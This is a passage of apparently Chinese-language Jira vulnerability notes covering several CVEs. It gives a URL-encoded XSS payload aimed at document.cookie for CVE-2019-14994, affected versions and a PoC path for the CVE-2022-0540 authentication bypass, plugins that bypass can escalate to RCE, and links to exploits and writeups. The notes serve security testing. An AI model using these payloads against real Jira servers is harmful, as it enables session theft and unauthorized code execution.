### CVE-2019-14994
```
jql=issuetype%20%3D%20Epic%20AND%20%22Story%20Points%22%20%3C%3D%20%22%5C%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%22%20AND%20%22Story%20Points%22%20%3E%3D%20%221%22
```

#### Ref
- https://github.com/bugbounty-site/exploits/blob/master/CVE-2019-14994/exploit.py

### [CVE-2021-26086] Jira受限文件读取绕过
- [CVE-2021-26086(CVE-2021-26085)受限文件读取挖掘分析](https://tttang.com/archive/1323/)
- [jira环境搭建及受限文件读取原理和深思CVE-2021-26086](https://xz.aliyun.com/t/10922)

### [CVE-2021-39115] Template Injection in Email Templates leads to code execution on Jira Service Management Server
- https://github.com/PetrusViet/CVE-2021-39115
- [Atlassian JIRA服务器模板注入漏洞分析及挖掘](https://xz.aliyun.com/t/11354)

### [CVE-2022-0540] Jira Seraph认证绕过
影响的产品：
```
Jira
Jira Core Server
Jira Software Server
Jira Software Data Center
Jira Service Management
Jira Service Management Server
Jira Service Management Data Center
```
影响版本：
对于Jira Core Server/Jira Software Server/Jira Software Data Center
```
All versions before 8.13.18
8.14.x
8.15.x
8.16.x
8.17.x
8.18.x
8.19.x
8.20.x before 8.20.6
8.21.x
```
对于Jira Service Management Server/Jira Service Management Data Center
```
All versions before 4.13.18
4.14.x
4.15.x
4.16.x
4.17.x
4.18.x
4.19.x
4.20.x before 4.20.6
4.21.x
```


### PoC
```
/InsightPluginShowGeneralConfiguration.jspa;
```
### 已知的可利用插件
- [WBS Gantt-Chart for Jira](https://marketplace.atlassian.com/apps/1211768/wbs-gantt-chart-for-jira?hosting=datacenter&tab=versions): Preauth RCE (you can write any Java code with beanshell).
- [Insight - Asset Management](https://marketplace.atlassian.com/apps/1212137/insight-asset-management?tab=overview&hosting=datacenter): Bundled with Jira Service Management Server and Data Center, View, change Insight configuration (can RCE with object schema manager permissions by change the groovy script whitelist).


Ref:
- https://github.com/adampielak/nuclei-templates/blob/41b5ac924c9324599d979bc1f36c058f167b31d4/CVE-2022-0540.yaml
- https://blog.viettelcybersecurity.com/cve-2022-0540-authentication-bypass-in-seraph/
- https://confluence.atlassian.com/jira/jira-security-advisory-2022-04-20-1115127899.html
